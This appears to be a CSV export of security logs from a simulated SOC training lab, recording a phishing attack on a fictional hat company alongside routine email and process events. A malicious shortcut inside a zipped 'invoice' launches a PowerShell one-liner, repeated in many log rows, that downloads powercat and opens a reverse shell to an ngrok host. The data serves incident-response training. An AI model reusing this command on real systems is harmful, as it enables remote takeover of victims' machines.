"3HV2ypsB8mE-0EyZG36V","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:     $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=39	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=    $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo Details: CommandInvocation(New-Object): ""New-Object""ParameterBinding(New-Object): name=""TypeName""; value=""System.Diagnostics.ProcessStartInfo""","-","""New-Object"", ""System.Diagnostics.ProcessStartInfo""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"4HV2ypsB8mE-0EyZJ36N","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell. Context Information: 	DetailSequence=1	DetailTotal=2	SequenceNumber=17	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell Details: CommandInvocation(Invoke-Expression): ""Invoke-Expression""","-","""Invoke-Expression""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"33V2ypsB8mE-0EyZI364","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:             Write-Verbose (""Connection to "" + $c + "":"" + $p + "" [tcp] succeeded!""). Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=31	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=            Write-Verbose (""Connection to "" + $c + "":"" + $p + "" [tcp] succeeded!"") Details: CommandInvocation(Write-Verbose): ""Write-Verbose""ParameterBinding(Write-Verbose): name=""Message""; value=""Connection to 2.tcp.ngrok.io:19282 [tcp] succeeded!""","-","""Write-Verbose"", ""Connection to 2.tcp.ngrok.io:19282 [tcp] succeeded!""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"23V2ypsB8mE-0EyZE37f","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:     $FuncVars[""Encoding""] = New-Object System.Text.AsciiEncoding. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=35	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=    $FuncVars[""Encoding""] = New-Object System.Text.AsciiEncoding Details: CommandInvocation(New-Object): ""New-Object""ParameterBinding(New-Object): name=""TypeName""; value=""System.Text.AsciiEncoding""","-","""New-Object"", ""System.Text.AsciiEncoding""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"5HV2ypsB8mE-0EyZXn6m","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line:     $FuncVars[""Encoding""] = New-Object System.Text.AsciiEncoding. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=49	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=    $FuncVars[""Encoding""] = New-Object System.Text.AsciiEncoding Details: CommandInvocation(New-Object): ""New-Object""ParameterBinding(New-Object): name=""TypeName""; value=""System.Text.AsciiEncoding""","-","""New-Object"", ""System.Text.AsciiEncoding""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"5XV2ypsB8mE-0EyZZX7p","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Temp\5\__PSScriptPolicyTest_hnpvwg1v.3mr.ps1","win-3450","-","-","-","-","-","-","powershell.exe","-","-",9060,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:03.304","-"
"7HV2ypsB8mE-0EyZiH72","-",logs,"-","-","-",powershell,"-","-","-","-","Pipeline Execution Details","-","-","win-3450","Pipeline execution details for command line: IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell. Context Information: 	DetailSequence=1	DetailTotal=1	SequenceNumber=15	UserId=SSF\michael.ascot	HostName=ConsoleHost	HostVersion=5.1.20348.1366	HostId=bbaf2919-3765-42de-b254-1953f32951cb	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell	EngineVersion=5.1.20348.1366	RunspaceId=b980ae09-17ad-4495-b218-4b1e52190205	PipelineId=1	ScriptName=	CommandLine=IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell Details: CommandInvocation(New-Object): ""New-Object""ParameterBinding(New-Object): name=""TypeName""; value=""System.Net.WebClient""","-","""New-Object"", ""System.Net.WebClient""","-","-","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell","-","-","-","-","-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:02.304","-"
"6HV2ypsB8mE-0EyZeX53","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Temp\5\__PSScriptPolicyTest_tuwnh53e.jfw.ps1","win-3450","-","-","-","-","-","-","powershell.exe","-","-",3880,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:01.304","-"
"03V1ypsB8mE-0EyZ3X43","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3450","-","-","-","-","-","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -c ""IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 2.tcp.ngrok.io -p 19282 -e powershell""","powershell.exe","explorer.exe","3,180",3880,"C:\Windows\System32\WindowsPowerShell\v1.0\","-","-","-","-","-","-","Jan 17, 2026 @ 02:38:00.304","-"
"6nV2ypsB8mE-0EyZfX5H","-",logs,"-","-","-",sysmon,"-","-","-","-","File stream created (rule: FileCreateStreamHash)",15,"C:\Users\michael.ascot\AppData\Local\Temp\5\Temp1_ImportantInvoice-Febrary.zip\ImportantInvoice-Febrary\invioce.pdf.lnk","win-3450","-","-","-","-","-","-","Explorer.EXE","-","-",3180,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:37:59.304","-"
"5nV2ypsB8mE-0EyZaX6z","-",logs,"-","-","-",sysmon,"-","-","-","-","File stream created (rule: FileCreateStreamHash)",15,"C:\Users\michael.ascot\AppData\Local\Temp\5\Temp1_ImportantInvoice-Febrary.zip\ImportantInvoice-Febrary\invioce.pdf.lnk","win-3450","-","-","-","-","-","-","Explorer.EXE","-","-",3180,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:37:59.304","-"
"4nV2ypsB8mE-0EyZSn56","-",logs,"-",None," Forwarding this information to our design team for review and feedback",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","miguel.odonnell@tryhatme.com","-","-","-","jazmin@brimmedbeautiesco.com","FWD: Vendor Showcase: Latest Hat Materials and Designs","Jan 17, 2026 @ 02:37:55.304","-"
"0XV1ypsB8mE-0EyZun4N","-",logs,"-","-","-",sysmon,"-","3.22.53.161","2.tcp.ngrok.io","3.22.53.161","Dns query (rule: DnsQuery)",22,"-","win-3450","-",dns,"-","-","-","-","powershell.exe","-","-",3880,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:37:52.304","-"
"0nV1ypsB8mE-0EyZxX7K","-",logs,"-","-","-",sysmon,"-","185.199.111.133, 185.199.110.133, 185.199.109.133, 185.199.108.133","raw.githubusercontent.com","185.199.111.133, 185.199.110.133, 185.199.109.133, 185.199.108.133","Dns query (rule: DnsQuery)",22,"-","win-3450","-",dns,"-","-","-","-","powershell.exe","-","-",3880,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:37:51.304","-"
"3XV2ypsB8mE-0EyZG36a","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\UP4KOJQB\ImportantInvoice-Febrary.zip","win-3450","-","-","-","-","-","-","OUTLOOK.EXE","-","-",8668,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:37:48.304","-"
"3nV2ypsB8mE-0EyZHH4m","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\UP4KOJQB\ImportantInvoice-Febrary.zip","win-3450","-","-","-","-","-","-","OUTLOOK.EXE","-","-",8668,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:37:48.304","-"
"4XV2ypsB8mE-0EyZPn6-","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michael.ascot\AppData\Local\Microsoft\Windows\INetCache\Content.Outlook\UP4KOJQB\ImportantInvoice-Febrary.zip:Zone.Identifier","win-3450","-","-","-","-","-","-","OUTLOOK.EXE","-","-",8668,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:37:48.304","-"
"ynV1ypsB8mE-0EyZMX5V","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3457","-","-","-","-","-","-","spoolsv.exe","-","-",3841,"-","-","SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Fax (redirected 5)\DsDriver\driverVersion","HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Fax (redirected 5)\DsDriver\driverVersion",driverVersion,"-","-","Jan 17, 2026 @ 02:37:16.304","-"
"0HV1ypsB8mE-0EyZrn4_","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3460","-","-","-","-","-","taskhostw.exe KEYROAMING","taskhostw.exe","svchost.exe",3540,3737,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:37:12.304","-"
"z3V1ypsB8mE-0EyZn35D","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3449","-","-","-","-","-","atbroker.exe","AtBroker.exe","winlogon.exe",3886,3943,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:37:04.304","-"
"znV1ypsB8mE-0EyZnn6m","-",logs,"-",None," Just confirming the meeting link and expected duration for the interview",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","tim@chicchapeauqueen.com","-","-","-","liam.espinoza@tryhatme.com","RE: RE: Job Interview Invitation: Exciting Career Opportunity","Jan 17, 2026 @ 02:37:00.304","-"
"zXV1ypsB8mE-0EyZmn7P","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry object added or deleted (rule: RegistryEvent)",12,"-","win-3458","-","-","-","-","-","-","spoolsv.exe","-","-",3638,"-","-","System\CurrentControlSet\Enum\SWD\PRINTENUM\{2D00BA8B-3E7F-4C85-88E7-D1E9D13350F0}\FriendlyName","HKLM\System\CurrentControlSet\Enum\SWD\PRINTENUM\{2D00BA8B-3E7F-4C85-88E7-D1E9D13350F0}\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:37:00.304","-"
"y3V1ypsB8mE-0EyZPX4X","-",logs,"-",None," The happiest hat place on Earth is waiting for you Win an all expenses paid trip just click below and hope for the best",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","liam.espinoza@tryhatme.com","-","-","-","combs@hatventuresworldwide.online","Win a Trip to Hat Disneyland Magical Memories Await","Jan 17, 2026 @ 02:36:51.304","-"
"xXV0ypsB8mE-0EyZrH5s","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3461","-","-","-","-","-","""LogonUI.exe"" /flags:0x0 /state0:0xb572b855 /state1:0x41c64e6d","LogonUI.exe","winlogon.exe",3604,3822,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:36:40.304","-"
"x3V0ypsB8mE-0EyZvH4u","-",logs,"-",None," The upcoming seminar will cover the latest innovations in hat manufacturing and design Secure your spot today",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","skinner@fashionhatchronicle.com","-","-","-","contact@tryhatme.com","Seminar Registration: Hat Industry Innovation Trends","Jan 17, 2026 @ 02:36:40.304","-"
"zHV1ypsB8mE-0EyZUX4G","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3454","-","-","-","-","-","C:\Windows\system32\rundll32.exe C:\Windows\system32\inetcpl.cpl,ClearMyTracksByProcess Flags:276824072 WinX:0 WinY:0 IEFrame:0000000000000000","rundll32.exe","iexplore.exe",3861,3824,"C:\Users\liam.espinoza\Desktop\","-","-","-","-","-","-","Jan 17, 2026 @ 02:36:37.304","-"
"yHV0ypsB8mE-0EyZ037M","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3458","-","-","-","-","-","atbroker.exe","AtBroker.exe","winlogon.exe",3557,3548,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:36:28.304","-"
"yXV1ypsB8mE-0EyZEX75","-",logs,"-",None," Do you have estimated costs for different material options and production timelines",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","shah@trendyheadwearblog.com","-","-","-","ceo@tryhatme.com","RE: RE: Exploring Partnership Potential: Custom Hat Design Proposal","Jan 17, 2026 @ 02:36:23.304","-"
"w3V0ypsB8mE-0EyZgX6Y","-",logs,"-",None," Travel through time and experience the evolution of hats from ancient Egypt to futuristic Mars Only 500 per ticket",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","armaan.terry@tryhatme.com","-","-","-","stone@fashionindustrytrends.xyz","Time Traveling Hat Adventure Explore Ancient Lands for Cheap","Jan 17, 2026 @ 02:36:19.304","-"
"wnV0ypsB8mE-0EyZdX7S","-",logs,"-",None," Quit your job today and make 10000 per day from home All you need is an internet connection and zero critical thinking skills",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","gerard@headtoppersinc.xyz","-","-","-","contact@tryhatme.com","Work from Home and Make 10000 a Day Scam Alert","Jan 17, 2026 @ 02:36:16.304","-"
"wHV0ypsB8mE-0EyZP34a","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3449","-","-","-","-","-","C:\Windows\servicing\TrustedInstaller.exe","TrustedInstaller.exe","services.exe",3965,3535,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:36:10.304","-"
"v3V0ypsB8mE-0EyZO34p","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3456","-","-","-","-","-","taskhostw.exe NGCKeyPregen","taskhostw.exe","svchost.exe",3601,3756,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:36:10.304","-"
"xHV0ypsB8mE-0EyZoH7n","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3453","-","-","-","-","-","""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE"" ","OUTLOOK.EXE","explorer.exe",3722,3903,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:36:07.304","-"
"xnV0ypsB8mE-0EyZtH41","-",logs,"-",None," Thank you for the opportunity I confirm my availability and look forward to speaking with your team",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","invoice@tryhatme.com","-","-","-","levine@trendytopperssummit.com","RE: Job Interview Invitation: Exciting Career Opportunity","Jan 17, 2026 @ 02:36:04.304","-"
"vXV0ypsB8mE-0EyZCH5f","-",logs,"-",None," Do you have a booth number or schedule for presentations I would like to plan accordingly",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","armaan.terry@tryhatme.com","-","-","-","effie@hatcouturecompany.net","RE: RE: Upcoming Trade Show Attendance: Meet our Hat Experts","Jan 17, 2026 @ 02:35:47.304","-"
"wXV0ypsB8mE-0EyZZn47","-",logs,"-",None," Stock up now with this once in a lifetime deal Buy 100 hats and get 99 more free because we definitely did the math right",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","liam.espinoza@tryhatme.com","-","-","-","odom@gmail.com","Exclusive Offer: Buy 100 Hats Get 99 Free Limited Time Only","Jan 17, 2026 @ 02:35:36.304","-"
"vnV0ypsB8mE-0EyZI37T","-",logs,"-","-","-",sysmon,"-","172.16.1.15","mailsrv-01.tryhatme.com","172.16.1.15","Dns query (rule: DnsQuery)",22,"-","win-3456","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3978,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:35:35.304","-"
"u3VzypsB8mE-0EyZzX7L","-",logs,"-",None," Looking forward to hearing the updates.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","miguel.odonnell@tryhatme.com","-","-","-","miguel.odonnell@tryhatme.com","RE: CEO Address - Company Vision and Goals","Jan 17, 2026 @ 02:35:33.304","-"
"vHVzypsB8mE-0EyZ2X6d","-",logs,"-","-","-",sysmon,"-","-","-","-","File created (rule: FileCreate)",11,"C:\Users\michelle.smith\Downloads\forceupdate.ps1","win-3459","-","-","-","-","-","-","IEXPLORE.EXE","-","-",8013,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:35:06.304","-"
"unVzypsB8mE-0EyZnn7p","-",logs,"-",None," Take a look at this and send me your inputs.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","invoice@tryhatme.com","-","-","-","invoice@tryhatme.com","FWD: Marketing Campaign Strategy - Feedback Needed","Jan 17, 2026 @ 02:34:45.304","-"
"uXVzypsB8mE-0EyZj35v","-",logs,"-","-","-",sysmon,"-","172.16.1.15","mailsrv-01.tryhatme.com","172.16.1.15","Dns query (rule: DnsQuery)",22,"-","win-3460","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3979,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:34:42.304","-"
"uHVzypsB8mE-0EyZCn5w","-",logs,"-","-","-",sysmon,"-","172.16.1.15","mailsrv-01.tryhatme.com","172.16.1.15","Dns query (rule: DnsQuery)",22,"-","win-3455","-",dns,"-","-","-","-","OUTLOOK.EXE","-","-",3946,"-","-","-","-","-","-","-","Jan 17, 2026 @ 02:34:41.304","-"
"t3VyypsB8mE-0EyZ9n7l","-",logs,"-",None," Thank you for the opportunity I confirm my availability and look forward to speaking with your team",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","michelle.smith@tryhatme.com","-","-","-","rosario@chicchapeauconclave.com","RE: Job Interview Invitation: Exciting Career Opportunity","Jan 17, 2026 @ 02:34:19.304","-"
"tnVyypsB8mE-0EyZ037w","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3457","-","-","-","-","-","C:\Windows\system32\rundll32.exe C:\Windows\system32\inetcpl.cpl,ClearMyTracksByProcess Flags:8388616 WinX:0 WinY:0 IEFrame:0000000000000000","rundll32.exe","iexplore.exe",3732,3702,"C:\Users\diego.summers\Desktop\","-","-","-","-","-","-","Jan 17, 2026 @ 02:34:15.304","-"
"tXVyypsB8mE-0EyZcn4Z","-",logs,"-",None," Any updates on the marketing side?",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","ashwin.johnston@tryhatme.com","-","-","-","ashwin.johnston@tryhatme.com","RE: RE: New Product Launch - All Hands on Deck","Jan 17, 2026 @ 02:34:15.304","-"
"tHVyypsB8mE-0EyZZn6n","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3457","-","-","-","-","-","""C:\Windows\System32\Sethc.exe"" /AccessibilitySoundAgent","sethc.exe","AtBroker.exe",3736,3745,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:34:09.304","-"
"snVyypsB8mE-0EyZO36Y","-",logs,"-",None," Here is a summary of our last discussion along with action items for the next steps Let us know if you have any modifications",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","armaan.terry@tryhatme.com","-","-","-","hannah@chicchapeauqueen.com","Follow-up on Previous Discussion: Next Steps for Engagement","Jan 17, 2026 @ 02:34:02.304","-"
"s3VyypsB8mE-0EyZQ35Z","-",logs,"-",None," We would love to schedule a live demonstration to showcase our product capabilities Let us know a time that works for your team",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","stark@headwearreporter.net","-","-","-","diego.summers@tryhatme.com","Request for Product Demo: Exploring Partnership Potential","Jan 17, 2026 @ 02:33:25.304","-"
"sHVxypsB8mE-0EyZwn5w","-",logs,"-",None," Quit your job today and make 10000 per day from home All you need is an internet connection and zero critical thinking skills",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","armaan.terry@tryhatme.com","-","-","-","griffin@hatventuresworldwide.online","Work from Home and Make 10000 a Day Scam Alert","Jan 17, 2026 @ 02:33:15.304","-"
"sXVyypsB8mE-0EyZI373","-",logs,"-",None," Hurry These suspiciously cheap hotel vouchers are selling fast Book now before they totally stop working upon arrival",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","tobias@fashionforwardhats.me","-","-","-","support@tryhatme.com","Scam Alert Fake Hat Hotel Vouchers Up for Grabs","Jan 17, 2026 @ 02:33:10.304","-"
"rnVxypsB8mE-0EyZUX5d","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry value set (rule: RegistryEvent)",13,"-","win-3460","-","-","-","-","-","-","spoolsv.exe","-","-",3746,"-","-","SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Fax (redirected 4)\DsDriver\driverVersion","HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\Fax (redirected 4)\DsDriver\driverVersion",driverVersion,"-","-","Jan 17, 2026 @ 02:33:03.304","-"
"r3VxypsB8mE-0EyZfH48","-",logs,"-",None," Quit your job today and make 10000 per day from home All you need is an internet connection and zero critical thinking skills",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","marshall@chicmillinerydesigns.de","-","-","-","cain.omoore@tryhatme.com","Work from Home and Make 10000 a Day Scam Alert","Jan 17, 2026 @ 02:32:47.304","-"
"rXVxypsB8mE-0EyZKn5E","-",logs,"-",None," I can help out—just let me know what’s needed.",email,internal,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","ceo@tryhatme.com","-","-","-","ceo@tryhatme.com","RE: Employee Appreciation Day - Volunteer Sign-Up","Jan 17, 2026 @ 02:32:39.304","-"
"qnVwypsB8mE-0EyZ437u","-",logs,"-",None," Travel through time and experience the evolution of hats from ancient Egypt to futuristic Mars Only 500 per ticket",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","burns@hatindustryinsights.xyz","-","-","-","support@tryhatme.com","Time Traveling Hat Adventure Explore Ancient Lands for Cheap","Jan 17, 2026 @ 02:32:24.304","-"
"rHVwypsB8mE-0EyZ_37D","-",logs,"-",None," We see a strong opportunity for collaboration on custom designs Let’s set up a session to refine ideas and explore possibilities",email,inbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","contact@tryhatme.com","-","-","-","burns@fashionforwardhatter.com","Exploring Partnership Potential: Custom Hat Design Proposal","Jan 17, 2026 @ 02:32:02.304","-"
"q3VwypsB8mE-0EyZ_34m","-",logs,"-","-","-",sysmon,"-","-","-","-","Registry object added or deleted (rule: RegistryEvent)",12,"-","win-3454","-","-","-","-","-","-","spoolsv.exe","-","-",3667,"-","-","System\CurrentControlSet\Control\DeviceClasses\{0ecef634-6ef0-472a-8085-5ad023ecbccd}\##?#SWD#PRINTENUM#{9A7D6000-6360-4067-AFEC-3F8722701AC5}#{0ecef634-6ef0-472a-8085-5ad023ecbccd}\#\Device Parameters\FriendlyName","HKLM\System\CurrentControlSet\Control\DeviceClasses\{0ecef634-6ef0-472a-8085-5ad023ecbccd}\##?#SWD#PRINTENUM#{9A7D6000-6360-4067-AFEC-3F8722701AC5}#{0ecef634-6ef0-472a-8085-5ad023ecbccd}\#\Device Parameters\FriendlyName",FriendlyName,"-","-","Jan 17, 2026 @ 02:32:00.304","-"
"qXVwypsB8mE-0EyZin5o","-",logs,"-",None," Pack your bags You have won an all expenses paid trip to Hat Wonderland No passport required just your credit card details",email,outbound,"-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","-","wanda@styleinfluencerhub.info","-","-","-","diego.summers@tryhatme.com","Youve Won a Free Trip to Hat Wonderland Click Here to Claim","Jan 17, 2026 @ 02:31:59.304","-"
"pXVvypsB8mE-0EyZwn6_","-",logs,"-","-","-",sysmon,"-","-","-","-","Process Create (rule: ProcessCreate)",1,"-","win-3459","-","-","-","-","-","C:\Windows\system32\svchost.exe -k wsappx -p","svchost.exe","services.exe",3700,3842,"C:\Windows\system32\","-","-","-","-","-","-","Jan 17, 2026 @ 02:31:12.304","-"
